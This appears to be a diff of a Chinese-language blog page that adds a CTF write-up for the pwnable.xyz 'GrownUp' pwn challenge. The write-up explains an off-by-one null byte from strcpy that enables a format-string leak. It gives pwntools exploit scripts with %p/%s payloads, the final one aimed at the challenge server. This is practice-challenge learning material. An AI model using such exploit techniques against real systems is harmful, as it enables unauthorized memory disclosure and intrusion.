@@ -3,30 +3,37 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>friends - thatshaman&#39;s site</title>
+  <title>pwnable.xyz GrownUp WriteUp - thatshaman&#39;s site</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="friends">
-<meta property="og:url" content="http://shiroinu.top/PY.html">
+  <meta name="description" content="pwnable.xyz 上的GrownUp的WriteUp。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.xyz GrownUp WriteUp">
+<meta property="og:url" content="http://shiroinu.top/2019/09/12/grownup/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
+<meta property="og:description" content="pwnable.xyz 上的GrownUp的WriteUp。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
-<meta property="og:updated_time" content="2019-08-07T14:57:49.285Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png">
+<meta property="og:updated_time" content="2019-09-12T11:58:58.728Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="friends">
-<meta name="twitter:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
+<meta name="twitter:title" content="pwnable.xyz GrownUp WriteUp">
+<meta name="twitter:description" content="pwnable.xyz 上的GrownUp的WriteUp。">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568295485395">
+  <link rel="stylesheet" href="/css/style.css?v=1568295485470">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -151,58 +158,81 @@
               <i class="mdui-icon material-icons">menu</i>
             </a>
           </div>
-        <style>
-  article ul {
-    list-style-type: none;
-    padding: 0;
-    display: flex;
-    flex-direction: row;
-    flex-wrap: wrap;
-    margin: -5px;
-  }
-  article ul li {
-    transition: all .03s;
-    width: calc(12.5% - 10px);
-    margin: 5px;
-    border-radius: 4px;
-    border: 1px solid #eee;
-    font-size: 0;
-    overflow: hidden;
-  }
-  article ul li > a::after {
-    font-size: 13px;
-    color: #606266;
-    -webkit-transition: none;
-    transition: none;
-    content: attr(title);
-    display: block;
-    position: relative;
-    width: 100%;
-    border: none;
-    padding: 3px 10px 5px 10px;
-    margin-top: -2px;
-    text-align: center;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-  }
-  article ul li img {
-    width: 100%;
-    border-radius: 0;
-    border: none;
-  }
-  @media screen and (max-width: 768px) {
-    article ul li {
-      width: calc(33.3333333333% - 10px);
-    }
-}
-</style>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>pwnable.xyz GrownUp WriteUp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
+    <a><i class="nexmoefont icon-areachart"></i>532 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>pwnable.xyz 上的GrownUp的WriteUp。</p>
+<a id="more"></a>
 
-<div class="nexmoe-post">
-  <article class="nexmoe-py">
-    <ul>
-<li><a href="https://wood1314.github.io/" title="木头的小木屋" target="_blank" rel="noopener"><img src="http://i2.tiimg.com/696456/dff885aca477af78.jpg" alt="木头的小木屋"></a></li>
-</ul>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p>
+<p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p>
+<p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p>
+<p>实际上是提示了我们服务器端的flag地址是0x601080</p>
+<p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p>
+<p>在gdb中发现<code>qword_601160</code>的值为0x601168</p>
+<p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p>
+<p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p>
+<pre><code>read(0, src, 0x80uLL)
+strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p>
+<p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p>
+<p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p>
+<pre><code class="python">from pwn import * 
+context.log_level = &#39;DEBUG&#39;
+sh = process(&#39;./GrownUpRedist&#39;)
+flag = 0x601080
+payload = &#39;&#39;
+payload += &#39;y&#39; * 8 + p64(flag)
+sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)
+sh.send(payload)
+payload = &#39;&#39;
+payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;
+
+length = len(payload)
+payload += &#39;A&#39; * (128 - length)
+
+sh.recvuntil(&#39;Name: &#39;)
+sh.sendline(payload)
+print(sh.recvall())
+sh.interactive()</code></pre>
+<p>在试运行时发现</p>
+<p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p>
+<p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
+from pwn import * 
+context.log_level = &#39;DEBUG&#39;
+#sh = process(&#39;./GrownUpRedist&#39;)
+sh = remote(&#39;svc.pwnable.xyz&#39;,30004)
+flag = 0x601080
+payload = &#39;&#39;
+payload += &#39;y&#39; * 8 + p64(flag)
+sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)
+sh.send(payload)
+#这里如果是sendline()就会报错 原因不明
+payload = &#39;&#39;
+payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;
+#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flag
+length = len(payload)
+payload += &#39;A&#39; * (128 - length)
+#payload.ljust(128,&#39;A&#39;)
+#print(payload)
+sh.recvuntil(&#39;Name: &#39;)
+sh.sendline(payload)
+print(sh.recvall())
+sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
